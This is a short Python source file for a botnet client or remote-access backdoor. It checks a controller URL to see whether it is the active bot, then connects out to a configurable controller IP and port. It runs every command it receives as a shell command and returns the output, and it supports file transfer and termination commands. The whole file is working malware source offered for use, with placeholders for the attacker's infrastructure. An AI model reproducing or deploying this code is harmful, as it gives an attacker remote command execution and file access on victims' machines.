import modules, urllib.request, time, socket, subprocess


botname = ''			# Put name of bot here
host = '127.0.0.1'		# Put controller IP here
port = 8080				# Put controller listening port here
connections = {
	'source':'',		# Put URL for update here. Leave blank for manual only.
	'instruction':''	# Put url for currently active device here.
}
ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname ) # finds if instruction matches current bot

# connection ============================================= #
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	while True: 
		command = s.recv(1024)

		if '==terminate' in command:
			s.close()
			break
		elif '==transfer' in command: 
			cmd,path = command.split('*')

			try:
				modules.transfer(s,path)
			except Exception as e:
				s.send ( str(e) ) # send the exception error
				pass
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send( CMD.stdout.read() ) 
			s.send( CMD.stderr.read() )
# ======================================================== #

while True:
	if ACTIVE == False:
		time.sleep(1)
		continue
	else:
		connect()